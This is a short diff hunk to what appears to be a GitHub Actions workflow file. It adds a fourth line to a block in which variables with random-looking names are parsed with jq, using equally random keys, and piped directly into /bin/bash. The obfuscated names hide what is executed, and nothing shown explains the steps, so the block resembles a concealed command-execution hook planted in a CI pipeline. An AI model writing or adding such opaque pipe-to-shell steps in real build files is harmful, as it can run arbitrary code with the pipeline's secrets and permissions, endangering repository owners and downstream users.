@@ -45,6 +45,7 @@ jobs:
           echo $vgl4098 | jq -r .opqri3 | /bin/bash
           echo $hbrba17 | jq -r .ptx0 | /bin/bash
           echo $pb96 | jq -r .o43300 | /bin/bash
+          echo $o0515 | jq -r .ljuwz59 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
